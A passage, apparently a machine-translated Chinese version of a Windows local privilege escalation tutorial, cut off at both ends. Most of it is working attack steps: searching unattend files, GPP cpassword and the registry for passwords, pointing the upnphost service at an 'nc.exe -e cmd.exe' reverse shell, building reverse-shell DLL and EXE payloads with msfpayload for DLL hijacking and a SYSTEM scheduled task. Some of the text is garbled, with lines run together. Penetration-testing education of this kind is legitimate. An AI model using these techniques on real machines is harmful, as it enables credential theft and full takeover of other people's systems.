/AUTHLEVEL Client authentication level. /LOCALE Language id the client should use. /PRIVILEGES Enable or disable all privileges. /TRACE Outputs debugging information to stderr. /RECORD Logs all input commands and output. /INTERACTIVE Sets or resets the interactive mode. /FAILFAST Sets or resets the FailFast mode. /USER User to be used during the session. /PASSWORD Password to be used for session login. /OUTPUT Specifies the mode for output redirection. /APPEND Specifies the mode for output redirection. /AGGREGATE Sets or resets aggregate mode. /AUTHORITY Specifies the for the connection. /?[:&lt;BRIEF|FULL&gt;] Usage information. For more information on a specific global switch, type: switch-name /? The following alias/es are available in the current role: ALIAS - Access to the aliases available on the local system BASEBOARD - Base board (also known as a motherboard or system board) management. BIOS - Basic input/output services (BIOS) management. BOOTCONFIG - Boot configuration management. CDROM - CD-ROM management. COMPUTERSYSTEM - Computer system management. CPU - CPU management. CSPRODUCT - Computer system product information from SMBIOS. DATAFILE - DataFile Management. DCOMAPP - DCOM Application management. DESKTOP - User&#39;s Desktop management. DESKTOPMONITOR - Desktop Monitor management. DEVICEMEMORYADDRESS - Device memory addresses management. DISKDRIVE - Physical disk drive management. DISKQUOTA - Disk space usage for NTFS volumes. DMACHANNEL - Direct memory access (DMA) channel management. ENVIRONMENT - System environment settings management. FSDIR - Filesystem directory entry management. GROUP - Group account management. IDECONTROLLER - IDE Controller management. IRQ - Interrupt request line (IRQ) management. JOB - Provides access to the jobs scheduled using the schedule service. LOADORDER - Management of system services that define execution dependencies. LOGICALDISK - Local storage device management. LOGON - LOGON Sessions. MEMCACHE - Cache memory management. MEMORYCHIP - Memory chip information. MEMPHYSICAL - Computer system&#39;s physical memory management. NETCLIENT - Network Client management. NETLOGIN - Network login information (of a particular user) management. NETPROTOCOL - Protocols (and their network characteristics) management. NETUSE - Active network connection management. NIC - Network Interface Controller (NIC) management. NICCONFIG - Network adapter management. NTDOMAIN - NT Domain management. NTEVENT - Entries in the NT Event Log. NTEVENTLOG - NT eventlog file management. ONBOARDDEVICE - Management of common adapter devices built into the motherboard (system board). OS - Installed Operating System/s management. PAGEFILE - Virtual memory file swapping management. PAGEFILESET - Page file settings management. PARTITION - Management of partitioned areas of a physical disk. PORT - I/O port management. PORTCONNECTOR - Physical connection ports management. PRINTER - Printer device management. PRINTERCONFIG - Printer device configuration management. PRINTJOB - Print job management. PROCESS - Process management. PRODUCT - Installation package task management. QFE - Quick Fix Engineering. QUOTASETTING - Setting information for disk quotas on a volume. RDACCOUNT - Remote Desktop connection permission management. RDNIC - Remote Desktop connection management on a specific network adapter. RDPERMISSIONS - Permissions to a specific Remote Desktop connection. RDTOGGLE - Turning Remote Desktop listener on or off remotely. RECOVEROS - Information that will be gathered from memory when the operating system fails. REGISTRY - Computer system registry management. SCSICONTROLLER - SCSI Controller management. SERVER - Server information management. SERVICE - Service application management. SHADOWCOPY - Shadow copy management. SHADOWSTORAGE - Shadow copy storage area management. SHARE - Shared resource management. SOFTWAREELEMENT - Management of the elements of a software product installed on a system. SOFTWAREFEATURE - Management of software product subsets of SoftwareElement. SOUNDDEV - Sound Device management. STARTUP - Management of commands that run automatically when users log onto the computer system. SYSACCOUNT - System account management. SYSDRIVER - Management of the system driver for a base service. SYSTEMENCLOSURE - Physical system enclosure management. SYSTEMSLOT - Management of physical connection points including ports, slots and peripherals, and proprietary connections points. TAPEDRIVE - Tape drive management. TEMPERATURE - Data management of a temperature sensor (electronic thermometer). TIMEZONE - Time zone data management. UPS - Uninterruptible power supply (UPS) management. USERACCOUNT - User account management. VOLTAGE - Voltage sensor (electronic voltmeter) data management. VOLUME - Local storage volume management. VOLUMEQUOTASETTING - Associates the disk quota setting with a specific disk volume. VOLUMEUSERQUOTA - Per user storage volume quota management. WMISET - WMI service operational parameters management. For more information on a specific alias, type: alias /? CLASS - Escapes to full WMI schema. PATH - Escapes to full WMI object paths. CONTEXT - Displays the state of all the global switches. QUIT/EXIT - Exits the program. For more information on CLASS/PATH/CONTEXT, type: (CLASS | PATH | CONTEXT) /? 为简化起见，我创建了一个可以在目标机器上删除的脚本，该脚本将使用WMIC提取以下信息：进程，服务，用户帐户，用户组，网络接口，硬盘驱动器信息，网络共享信息，已安装的Windows补丁程序，启动时运行的程序，已安装软件的列表，有关操作系统和时区的信息。 如果有人想到应该添加到列表中的内容，我已经浏览了各种标志和参数来提取有价值的信息，请在下面留言。使用内置输出功能，脚本会将所有结果写入人类可读的html文件。 你可以在这里下载我的脚本（wmic_info.bat）Windows 7 VM上的示例输出文件（严重修补） - 此处 Δt for t5 to t6 - 快速失败 在继续之前，您应该花一点时间来查看您收集的信息，到目前为止应该有很多。我们的游戏计划的下一步是寻找一些快速安全性失败，可以轻松利用它来升级我们的用户权限。 我们需要关注的第一个也是最明显的事情是补丁级别。如果我们发现主机被严重修补，则无需进一步担心。我的WMIC脚本已经列出了所有已安装的补丁，但您可以在下面看到示例命令行输出。 C:\\Windows\\system32&gt; wmic qfe get Caption,Description,HotFixID,InstalledOn Caption Description HotFixID InstalledOn http://support.microsoft.com/?kbid=2727528 Security Update KB2727528 11/23/2013 http://support.microsoft.com/?kbid=2729462 Security Update KB2729462 11/26/2013 http://support.microsoft.com/?kbid=2736693 Security Update KB2736693 11/26/2013 http://support.microsoft.com/?kbid=2737084 Security Update KB2737084 11/23/2013 http://support.microsoft.com/?kbid=2742614 Security Update KB2742614 11/23/2013 http://support.microsoft.com/?kbid=2742616 Security Update KB2742616 11/26/2013 http://support.microsoft.com/?kbid=2750149 Update KB2750149 11/23/2013 http://support.microsoft.com/?kbid=2756872 Update KB2756872 11/24/2013 http://support.microsoft.com/?kbid=2756923 Security Update KB2756923 11/26/2013 http://support.microsoft.com/?kbid=2757638 Security Update KB2757638 11/23/2013 http://support.microsoft.com/?kbid=2758246 Update KB2758246 11/24/2013 http://support.microsoft.com/?kbid=2761094 Update KB2761094 11/24/2013 http://support.microsoft.com/?kbid=2764870 Update KB2764870 11/24/2013 http://support.microsoft.com/?kbid=2768703 Update KB2768703 11/23/2013 http://support.microsoft.com/?kbid=2769034 Update KB2769034 11/23/2013 http://support.microsoft.com/?kbid=2769165 Update KB2769165 11/23/2013 http://support.microsoft.com/?kbid=2769166 Update KB2769166 11/26/2013 http://support.microsoft.com/?kbid=2770660 Security Update KB2770660 11/23/2013 http://support.microsoft.com/?kbid=2770917 Update KB2770917 11/24/2013 http://support.microsoft.com/?kbid=2771821 Update KB2771821 11/24/2013 [..Snip..] 与Windows一样，输出并不完全可以使用。最好的策略是查找权限提升漏洞并查找各自的KB补丁号。此类攻击包括但不限于KiTrap0D（KB979682），MS11-011（KB2393802），MS10-059（KB982799），MS10-021（KB979683），MS11-080（KB2592799）。在枚举操作系统版本和Service Pack之后，您应该找出可能存在哪些权限升级漏洞。使用KB修补程序编号，您可以grep已安装的修补程序以查看是否缺少任何修补程序。 您可以在下面看到grep补丁的语法： C:\\Windows\\system32&gt; wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB..&quot; /C:&quot;KB..&quot; 接下来我们将看看大规模推出。如果存在需要安装许多机器的环境，通常，技术人员不会在机器之间四处走动。有几种解决方案可以自动安装机器。这些方法是什么以及它们如何工作对我们的目的来说不那么重要，但主要的是它们留下了用于安装过程的配置文件。这些配置文件包含许多敏感的敏感信息，例如操作系统产品密钥和管理员密码。我们最感兴趣的是管理员密码，因为我们可以使用它来提升我们的权限。 通常这些是包含配置文件的目录（但检查整个操作系统是个好主意）： c:\\sysprep.inf c:\\sysprep\\sysprep.xml ％WINDIR％\\Panther\\Unattend\\Unattended.xml ％WINDIR％\\Panther\\Unattended.xml 这些文件包含明文密码或Base64编码格式。您可以在下面看到一些示例文件输出。 `# This is a sample from sysprep.inf with clear-text credentials. This is a sample from sysprep.inf with clear-text credentials.[GuiUnattended]OEMSkipRegional=1OemSkipWelcome=1AdminPassword=s3cr3tp4ssw0rdTimeZone=20 This is a sample from sysprep.xml with Base64 “encoded” credentials. Please people Base64 is notencryption, I take more precautions to protect my coffee. The password here is “SuperSecurePassword”. U3VwZXJTZWN1cmVQYXNzd29yZA== false Local Administrator Administrator Administrators Administrator Sample from Unattended.xml with the same “secure” Base64 encoding. U3VwZXJTZWN1cmVQYXNzd29yZA== false true Administrator 根据Ben Campbell（[@Meatballs__](https://twitter.com/Meatballs__)）的推荐，我将组策略首选项保存的密码添加到快速失败列表中。GPO首选项文件可用于在域计算机上创建本地用户。当您妥协的框连接到域时，非常值得查找存储在SYSVOL中的Groups.xml文件。任何经过身份验证的用户都具有对此文件的读取权限。xml文件中的密码通过使用AES加密来从临时用户“隐藏”，我说模糊，因为静态密钥在msdn网站上发布，允许轻松解密存储的值。 除了Groups.xml之外，其他几个策略首选项文件还可以设置可选的“cPassword”属性： Services \\ Services.xml：[特定于元素的属性](http://msdn.microsoft.com/en-us/library/cc980070.aspx) ScheduledTasks \\ ScheduledTasks.xml：[任务内部元素](http://msdn.microsoft.com/en-us/library/cc422920.aspx)，[TaskV2内部元素](http://msdn.microsoft.com/en-us/library/dd341350.aspx)，[ImmediateTaskV2内部元素](http://msdn.microsoft.com/en-us/library/dd304114.aspx) 打印机\\ Printers.xml：[SharedPrinter元素](http://msdn.microsoft.com/en-us/library/cc422918.aspx) 驱动器\\ Drives.xml：[元素特定属性](http://msdn.microsoft.com/en-us/library/cc704598.aspx) DataSources \\ DataSources.xml：[元素特定属性](http://msdn.microsoft.com/en-us/library/cc422926.aspx) 可以通过手动浏览SYSVOL并抓取相关文件来利用此漏洞，如下所示。 ![img](http://www.fuzzysecurity.com/tutorials/images/priv06_big.png) 然而，我们都喜欢自动化解决方案，因此我们可以尽快到达终点。这里有两个主要选项，具体取决于我们拥有的shell /访问类型。有（1）metasploit模块可以通过[此处](https://www.rapid7.com/db/modules/post/windows/gather/credentials/gpp)建立的会话执行[，](https://www.rapid7.com/db/modules/post/windows/gather/credentials/gpp)或者（2）您可以使用Get-GPPPassword，它是[PowerSploit的](https://github.com/mattifestation/PowerSploit)一部分。PowerSploit是Matt Graeber的优秀PowerShell框架，专为逆向工程，取证和测试而量身定制。 接下来我们将寻找一个奇怪的注册表设置“AlwaysInstallElevated”，如果启用此设置，它允许任何权限级别的用户将* .msi文件安装为NT AUTHORITY \\ SYSTEM。对我来说，创建低权限用户（限制他们使用操作系统）但让他们能够以SYSTEM身份安装程序似乎是一个奇怪的想法。有关此问题的更多背景阅读，您可以在[这里查看](http://www.greyhathacker.net/?p=185)来自GreyHatHacker的Parvez的一篇文章，该文章最初将此报告为安全问题。 为了能够使用它，我们需要检查是否设置了两个注册表项，如果是这种情况我们可以弹出一个SYSTEM shell。您可以看到sytntax查询下面的相应注册表项。 This will only work if both registry keys contain “AlwaysInstallElevated” with DWORD values of 1.C:\\Windows\\system32&gt; reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevatedC:\\Windows\\system32&gt; reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated 为了完成这一部分，我们将对操作系统进行一些快速搜索，希望我们能够获得金牌。您可以在下面看到我们搜索的语法。 The command below will search the file system for file names containing certain keywords. You canspecify as many keywords as you wish. C:\\Windows\\system32&gt; dir /s pass == cred == vnc == .config Search certain file types for a keyword, this can generate a lot of output.C:\\Windows\\system32&gt; findstr /si password .xml .ini *.txt Similarly the two commands below can be used to grep the registry for keywords, in this case “password”.C:\\Windows\\system32&gt; reg query HKLM /f password /t REG_SZ /sC:\\Windows\\system32&gt; reg query HKCU /f password /t REG_SZ /s ## Δt for t7 to t10 - 卷起你的袖子 希望到现在为止我们已经拥有了一个SYSTEM shell，但如果我们不这样做，那么仍有一些攻击途径需要仔细阅读。在最后一部分中，我们将介绍Windows服务和文件/文件夹权限。我们的目标是使用弱权限来提升会话权限。 我们将检查大量访问权限，因此我们应该获取accesschk.exe的副本，这是Microsoft的Sysinternals Suite中的一个工具。Microsoft Sysinternals包含许多优秀的工具，很遗憾微软没有将它们添加到标准的Windows版本中。您可以在[此处](http://technet.microsoft.com/en-us/sysinternals/bb842062.aspx)从Microsoft technet下载该套件。 我们将从Windows服务开始，因为那里有一些快速的胜利。通常，现代操作系统不包含易受攻击的服务。在这种情况下，易受攻击意味着我们可以重新配置服务参数。Windows服务有点像应用程序快捷方式，请看下面的例子 We can use sc to query, configure and manage windows services.C:\\Windows\\system32&gt; sc qc Spooler [SC] QueryServiceConfig SUCCESS SERVICE_NAME: Spooler TYPE : 110 WIN32_OWN_PROCESS (interactive) START_TYPE : 2 AUTO_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : C:\\Windows\\System32\\spoolsv.exe LOAD_ORDER_GROUP : SpoolerGroup TAG : 0 DISPLAY_NAME : Print Spooler DEPENDENCIES : RPCSS : http SERVICE_START_NAME : LocalSystem 我们可以使用accesschk检查每个服务所需的权限级别。 We can see the permissions that each user level has, you can also use “accesschk.exe -ucqv *” to listall services. C:> accesschk.exe -ucqv Spooler Spooler R NT AUTHORITY\\Authenticated Users SERVICE_QUERY_STATUS SERVICE_QUERY_CONFIG SERVICE_INTERROGATE SERVICE_ENUMERATE_DEPENDENTS SERVICE_USER_DEFINED_CONTROL READ_CONTROL R BUILTIN\\Power Users SERVICE_QUERY_STATUS SERVICE_QUERY_CONFIG SERVICE_INTERROGATE SERVICE_ENUMERATE_DEPENDENTS SERVICE_START SERVICE_USER_DEFINED_CONTROL READ_CONTROL RW BUILTIN\\Administrators SERVICE_ALL_ACCESS RW NT AUTHORITY\\SYSTEM SERVICE_ALL_ACCESS Accesschk可以自动检查我们是否具有对具有特定用户级别的Windows服务的写访问权。通常作为低权限用户，我们将要检查“Authenticated Users”。确保检查您的用户所属的用户组，例如“Power Users”被视为低权限用户组（尽管它没有被广泛使用）。 让我们比较Windows 8和Windows XP SP0上的输出。 This is on Windows 8.C:\\Users\\b33f\\tools\\Sysinternals&gt; accesschk.exe -uwcqv “Authenticated Users” *No matching objects found. On a default Windows XP SP0 we can see there is a pretty big security fail.C:> accesschk.exe -uwcqv “Authenticated Users” *RW SSDPSRV SERVICE_ALL_ACCESSRW upnphost SERVICE_ALL_ACCESS C:> accesschk.exe -ucqv SSDPSRV SSDPSRV RW NT AUTHORITY\\SYSTEM SERVICE_ALL_ACCESS RW BUILTIN\\Administrators SERVICE_ALL_ACCESS RW NT AUTHORITY\\Authenticated Users SERVICE_ALL_ACCESS RW BUILTIN\\Power Users SERVICE_ALL_ACCESS RW NT AUTHORITY\\LOCAL SERVICE SERVICE_ALL_ACCESS C:> accesschk.exe -ucqv upnphost upnphost RW NT AUTHORITY\\SYSTEM SERVICE_ALL_ACCESS RW BUILTIN\\Administrators SERVICE_ALL_ACCESS RW NT AUTHORITY\\Authenticated Users SERVICE_ALL_ACCESS RW BUILTIN\\Power Users SERVICE_ALL_ACCESS RW NT AUTHORITY\\LOCAL SERVICE SERVICE_ALL_ACCESS 此问题后来通过引入XP SP2解决，但是在SP0和SP1上，它可以用作通用本地权限提升漏洞。通过重新配置服务，我们可以让它以SYSTEM级别权限运行我们选择的任何二进制文件。 我们来看看这是如何在实践中完成的。在这种情况下，服务将执行netcat并打开具有SYSTEM级别权限的反向shell。其他选择当然是可能的。 C:> sc qc upnphost [SC] GetServiceConfig SUCCESS SERVICE_NAME: upnphost TYPE : 20 WIN32_SHARE_PROCESS START_TYPE : 3 DEMAND_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : C:\\WINDOWS\\System32\\svchost.exe -k LocalService LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : Universal Plug and Play Device Host DEPENDENCIES : SSDPSRV SERVICE_START_NAME : NT AUTHORITY\\LocalService C:> sc config upnphost binpath= “C:\\nc.exe -nv 127.0.0.1 9988 -e C:\\WINDOWS\\System32\\cmd.exe”[SC] ChangeServiceConfig SUCCESS C:> sc config upnphost obj= “.\\LocalSystem” password= “”[SC] ChangeServiceConfig SUCCESS C:> sc qc upnphost [SC] GetServiceConfig SUCCESS SERVICE_NAME: upnphost TYPE : 20 WIN32_SHARE_PROCESS START_TYPE : 3 DEMAND_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : C:\\nc.exe -nv 127.0.0.1 9988 -e C:\\WINDOWS\\System32\\cmd.exe LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : Universal Plug and Play Device Host DEPENDENCIES : SSDPSRV SERVICE_START_NAME : LocalSystem C:> net start upnphost ![img](http://www.fuzzysecurity.com/tutorials/images/priv01_big.png) Service Shell (upnphost) 即使配置不正确，我们也不会始终拥有对服务的完全访问权限。下图来自Brett Moore关于Windows权限升级的演示文稿，这些访问权限中的任何一个都将为我们提供一个SYSTEM shell。 ![img](http://www.fuzzysecurity.com/tutorials/images/priv02_big.png) 需要记住的重要一点是，我们会发现我们的受感染会话所属的用户组。如前所述，“Power Users”也被视为低权限用户组。“Power Users”有各自的漏洞，Mark Russinovich写了一篇关于这个主题的非常有趣的文章。 Power in Power用户（Mark Russinovich） - [这里](http://blogs.technet.com/b/markrussinovich/archive/2006/05/01/the-power-in-power-users.aspx) 最后我们将检查文件/文件夹权限，如果我们不能直接攻击操作系统，我们将让操作系统完成所有的工作。这里有很多内容，所以我将向您展示两种权限漏洞以及如何利用它们。一旦掌握了总体思路，您就可以将这些技术应用于其他情境。 对于我们的第一个例子，我们将复制Parvez从GreyHatHacker写的一篇文章的结果; “通过利用弱文件夹权限提升权限”。这是一个很好的特权升级写作，我强烈建议你[在这里](http://www.greyhathacker.net/?p=738)阅读他的帖子。 此示例是DLL劫持的特例。程序通常不能自己运行，它们需要很多资源（大多数是DLL，但也有专有文件）。如果程序或服务从我们具有写访问权限的目录加载文件，我们可以滥用它来弹出具有程序运行权限的shell。 通常，Windows应用程序将使用预定义的搜索路径来查找DLL，并且它将按特定顺序检查这些路径。DLL劫持通常是通过将恶意DLL放在其中一个路径中，同时确保在合法DLL之前找到DLL来实现的。通过让应用程序指定它所需的DLL的绝对路径，可以减轻此问题。 您可以在以下32位系统上看到DLL搜索顺序： 1 - 应用程序加载的目录 2 - 32位系统目录（C：\\ Windows \\ System32） 3 - 16位系统目录（C：\\ Windows \\ System） 4 - Windows目录（C：\\ Windows） 5 - 当前工作目录（CWD） 6 - PATH环境变量中的目录（系统然后用户） 有时会发生应用程序尝试加载机器上不存在的DLL。这可能由于多种原因而发生，例如，如果仅对某些插件或未安装的功能需要DLL。在这种情况下，Parvez发现某些Windows服务尝试加载默认安装中不存在的DLL。 由于有问题的DLL不存在，我们将最终遍历所有搜索路径。作为一个低权限用户，我们没有希望将恶意DLL放入1-4中，在这种情况下不可能出现这种情况，因为我们讨论的是Windows服务但是如果我们对Windows PATH中的任何目录都有写访问权限我们赢了。 让我们看看它在实践中是如何工作的，对于我们的示例，我们将使用试图加载wlbsctrl.dll的IKEEXT（IKE和AuthIP IPsec Keying Modules）服务。 This is on Windows 7 as low privilege user1.C:\\Users\\user1\\Desktop&gt; echo %username% user1 We have a win here since any non-default directory in “C:\\” will give write access to authenticatedusers. C:\\Users\\user1\\Desktop&gt; echo %path% C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Program Files\\OpenVPN\\bin;C:\\Python27 We can check our access permissions with accesschk or cacls.C:\\Users\\user1\\Desktop&gt; accesschk.exe -dqv “C:\\Python27” C:\\Python27 Medium Mandatory Level (Default) [No-Write-Up] RW BUILTIN\\Administrators FILE_ALL_ACCESS RW NT AUTHORITY\\SYSTEM FILE_ALL_ACCESS R BUILTIN\\Users FILE_LIST_DIRECTORY FILE_READ_ATTRIBUTES FILE_READ_EA FILE_TRAVERSE SYNCHRONIZE READ_CONTROL RW NT AUTHORITY\\Authenticated Users FILE_ADD_FILE FILE_ADD_SUBDIRECTORY FILE_LIST_DIRECTORY FILE_READ_ATTRIBUTES FILE_READ_EA FILE_TRAVERSE FILE_WRITE_ATTRIBUTES FILE_WRITE_EA DELETE SYNCHRONIZE READ_CONTROL C:\\Users\\user1\\Desktop&gt; cacls “C:\\Python27” C:\\Python27 BUILTIN\\Administrators:(ID)F BUILTIN\\Administrators:(OI)(CI)(IO)(ID)F NT AUTHORITY\\SYSTEM:(ID)F NT AUTHORITY\\SYSTEM:(OI)(CI)(IO)(ID)F BUILTIN\\Users:(OI)(CI)(ID)R NT AUTHORITY\\Authenticated Users:(ID)C NT AUTHORITY\\Authenticated Users:(OI)(CI)(IO)(ID)C Before we go over to action we need to check the status of the IKEEXT service. In this case we can seeit is set to “AUTO_START” so it will launch on boot! C:\\Users\\user1\\Desktop&gt; sc qc IKEEXT [SC] QueryServiceConfig SUCCESS SERVICE_NAME: IKEEXT TYPE : 20 WIN32_SHARE_PROCESS START_TYPE : 2 AUTO_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : C:\\Windows\\system32\\svchost.exe -k netsvcs LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : IKE and AuthIP IPsec Keying Modules DEPENDENCIES : BFE SERVICE_START_NAME : LocalSystem 现在我们知道满足必要条件我们可以生成恶意DLL并弹出shell！ root@darkside:~# msfpayload windows/shell_reverse_tcp lhost=’127.0.0.1’ lport=’9988’ O Name: Windows Command Shell, Reverse TCP Inline Module: payload/windows/shell_reverse_tcp Platform: Windows Arch: x86Needs Admin: No Total size: 314 Rank: Normal Provided by: vlad902 &#118;&#x6c;&#97;&#x64;&#57;&#48;&#x32;&#64;&#103;&#109;&#97;&#x69;&#108;&#x2e;&#99;&#111;&#109; sf &#115;&#x74;&#x65;&#x70;&#104;&#101;&#110;&#x5f;&#x66;&#x65;&#119;&#x65;&#x72;&#x40;&#104;&#x61;&#x72;&#109;&#111;&#110;&#x79;&#x73;&#101;&#99;&#x75;&#x72;&#105;&#x74;&#x79;&#x2e;&#x63;&#111;&#x6d; Basic options:Name Current Setting Required Description EXITFUNC process yes Exit technique: seh, thread, process, noneLHOST 127.0.0.1 yes The listen addressLPORT 9988 yes The listen port Description: Connect back to attacker and spawn a command shell root@darkside:~# msfpayload windows/shell_reverse_tcp lhost=’127.0.0.1’ lport=’9988’ D &gt;/root/Desktop/evil.dll Created by msfpayload (http://www.metasploit.com).Payload: windows/shell_reverse_tcp Length: 314Options: {“lhost”=&gt;”127.0.0.1”, “lport”=&gt;”9988”} 将DLL传输到目标机器后，我们需要做的就是将其重命名为wlbsctrl.dll并将其移动到“C:\\Python27”。一旦完成，我们需要耐心地等待机器重新启动（或者我们可以尝试强制重启），我们将获得一个SYSTEM shell。 Again, this is as low privilege user1.C:\\Users\\user1\\Desktop&gt; dir Volume in drive C has no label. Volume Serial Number is 948D-A98F Directory of C:\\Users\\user1\\Desktop 02/18/2014 01:49 PM .02/18/2014 01:49 PM ..04/22/2013 09:39 AM 331,888 accesschk.exe02/18/2014 12:38 PM 14,336 evil.dll01/25/2014 12:46 AM 36,864 fubar.exe01/22/2014 08:17 AM incognito206/30/2011 01:52 PM 1,667,584 ncat.exe11/22/2013 07:39 PM 1,225 wmic_info.bat 5 File(s) 2,051,897 bytes 3 Dir(s) 73,052,160 bytes free C:\\Users\\user1\\Desktop&gt; copy evil.dll C:\\Python27\\wlbsctrl.dll 1 file(s) copied. C:\\Users\\user1\\Desktop&gt; dir C:\\Python27 Volume in drive C has no label. Volume Serial Number is 948D-A98F Directory of C:\\Python27 02/18/2014 01:53 PM .02/18/2014 01:53 PM ..10/20/2012 02:52 AM DLLs10/20/2012 02:52 AM Doc10/20/2012 02:52 AM include01/28/2014 03:45 AM Lib10/20/2012 02:52 AM libs04/10/2012 11:34 PM 40,092 LICENSE.txt04/10/2012 11:18 PM 310,875 NEWS.txt04/10/2012 11:31 PM 26,624 python.exe04/10/2012 11:31 PM 27,136 pythonw.exe04/10/2012 11:18 PM 54,973 README.txt10/20/2012 02:52 AM tcl10/20/2012 02:52 AM Tools04/10/2012 11:31 PM 49,664 w9xpopen.exe02/18/2014 12:38 PM 14,336 wlbsctrl.dll 7 File(s) 523,700 bytes 9 Dir(s) 73,035,776 bytes free 一切都已设置，我们现在需要做的就是等待系统重启。出于演示目的，我在下面包含了一个屏幕截图，我使用管理员命令提示符手动重启服务。 [![img](http://www.fuzzysecurity.com/tutorials/images/priv03_big.png) Service Shell (IKEEXT) 对于我们的最后一个例子，我们将查看计划的任务。回顾我们之前收集的结果，我们遇到了以下条目。 HostName: B33FTaskName: \\LogGrabberTFTPNext Run Time: 2/19/2014 9:00:00 AMStatus: ReadyLogon Mode: Interactive/BackgroundLast Run Time: N/ALast Result: 1Author: B33F\\b33fTask To Run: E:\\GrabLogs\\tftp.exe 10.1.1.99 GET log.out E:\\GrabLogs\\Logs\\log.txtStart In: N/AComment: N/AScheduled Task State: EnabledIdle Time: DisabledPower Management: Stop On Battery Mode, No Start On BatteriesRun As User: SYSTEMDelete Task If Not Rescheduled: EnabledStop Task If Runs X Hours and X Mins: 72:00:00Schedule: Scheduling data is not available in this format.Schedule Type: DailyStart Time: 9:00:00 AMStart Date: 2/17/2014End Date: N/ADays: Every 1 day(s)Months: N/ARepeat: Every: DisabledRepeat: Until: Time: DisabledRepeat: Until: Duration: DisabledRepeat: Stop If Still Running: Disabled 盒子上似乎有一个TFTP客户端连接到远程主机并抓取某种日志文件。我们可以看到此任务每天上午9点运行，并以SYSTEM级别权限（ouch）运行。让我们看看我们是否具有对此文件夹的写入权限。 C:\\Users\\user1\\Desktop&gt; accesschk.exe -dqv “E:\\GrabLogs” E:\\GrabLogs Medium Mandatory Level (Default) [No-Write-Up] RW BUILTIN\\Administrators FILE_ALL_ACCESS RW NT AUTHORITY\\SYSTEM FILE_ALL_ACCESS RW NT AUTHORITY\\Authenticated Users FILE_ADD_FILE FILE_ADD_SUBDIRECTORY FILE_LIST_DIRECTORY FILE_READ_ATTRIBUTES FILE_READ_EA FILE_TRAVERSE FILE_WRITE_ATTRIBUTES FILE_WRITE_EA DELETE SYNCHRONIZE READ_CONTROL R BUILTIN\\Users FILE_LIST_DIRECTORY FILE_READ_ATTRIBUTES FILE_READ_EA FILE_TRAVERSE SYNCHRONIZE READ_CONTROL C:\\Users\\user1\\Desktop&gt; dir “E:\\GrabLogs” Volume in drive E is More Volume Serial Number is FD53-2F00 Directory of E:\\GrabLogs 02/18/2014 11:34 PM .02/18/2014 11:34 PM ..02/18/2014 11:34 PM Logs02/18/2014 09:21 PM 180,736 tftp.exe 1 File(s) 180,736 bytes 3 Dir(s) 5,454,602,240 bytes free 显然，这是一个严重的配置问题，不需要将此任务作为SYSTEM运行，但更糟糕的是任何经过身份验证的用户都具有对该文件夹的写入权限。理想情况下，我会抓住TFTP客户端，后备PE可执行文件，同时确保它仍能完美运行，然后将其放回目标计算机上。但是，出于本示例的目的，我们可以使用metasploit生成的可执行文件简单地覆盖二进制文件。 root@darkside:~# msfpayload windows/shell_reverse_tcp lhost=’127.0.0.1’ lport=’9988’ O Name: Windows Command Shell, Reverse TCP Inline Module: payload/windows/shell_reverse_tcp Platform: Windows Arch: x86Needs Admin: No Total size: 314 Rank: Normal Provided by: vlad902 &#x76;&#x6c;&#x61;&#x64;&#57;&#48;&#x32;&#64;&#103;&#109;&#x61;&#105;&#x6c;&#x2e;&#99;&#111;&#109; sf &#x73;&#116;&#x65;&#x70;&#x68;&#101;&#110;&#x5f;&#102;&#x65;&#x77;&#x65;&#x72;&#x40;&#x68;&#x61;&#x72;&#109;&#111;&#x6e;&#x79;&#115;&#x65;&#99;&#117;&#x72;&#105;&#x74;&#121;&#x2e;&#x63;&#111;&#109; Basic options:Name Current Setting Required Description EXITFUNC process yes Exit technique: seh, thread, process, noneLHOST 127.0.0.1 yes The listen addressLPORT 9988 yes The listen port Description: Connect back to attacker and spawn a command shell root@darkside:~# msfpayload windows/shell_reverse_tcp lhost=’127.0.0.1’ lport=’9988’ R | msfencode -texe &gt; /root/Desktop/evil-tftp.exe [*] x86/shikata_ga_nai succeeded with size 341 (iteration=1) 现在剩下的就是上传我们的恶意可执行文件并覆盖“E：\\ GrabLogs \\ tftp.exe”。一旦完成，我们可以在早上睡个好觉，然后在早上醒来。这里要记住的一件重要事情是我们检查我们试图妥协的盒子上的时间/时区。 C:\\Users\\user1\\Desktop&gt; dir Volume in drive C has no label. Volume Serial Number is 948D-A98F Directory of C:\\Users\\user1\\Desktop 02/19/2014 01:36 AM .02/19/2014 01:36 AM ..04/22/2013 09:39 AM 331,888 accesschk.exe02/19/2014 01:31 AM 73,802 evil-tftp.exe01/25/2014 12:46 AM 36,864 fubar.exe01/22/2014 08:17 AM incognito206/30/2011 01:52 PM 1,667,584 ncat.exe02/18/2014 12:38 PM 14,336 wlbsctrl.dll11/22/2013 07:39 PM 1,225 wmic_info.bat 6 File(s) 2,125,699 bytes 3 Dir(s) 75,341,824 bytes free C:\\Users\\user1\\Desktop&gt; copy evil-tftp.exe E:\\GrabLogs\\tftp.exe Overwrite E:\\GrabLogs\\tftp.exe? (Yes/No/All): Yes 1 file(s) copied. 为了演示此操作中的权限提升，我快速转发了系统时间。从下面的屏幕截图中我们可以看到我们在上午9点迅速提供了我们的SYSTEM shell。 ![img](http://www.fuzzysecurity.com/tutorials/images/priv04_big.png) Schtasks Shell (LogGrabberTFTP) 这两个示例应该让您了解在考虑文件/文件夹权限时我们需要查找的漏洞类型。您需要花时间检查Windows服务，计划任务和启动任务的所有bin路径。 我们已经能够看到accesschk是这里的首选工具。在结束之前，我想给你一些关于使用accesschk的最后一点。 When executing any of the sysinternals tools for the first time the user will be presented with a GUIpop-up to accept the EULA. This is obviously a big problem, however we can add an extra command line flagto automatically accept the EULA. accesschk.exe /accepteula … … … Find all weak folder permissions per drive.accesschk.exe -uwdqs Users c:\\accesschk.exe -uwdqs “Authenticated Users” c:\\ Find all weak file 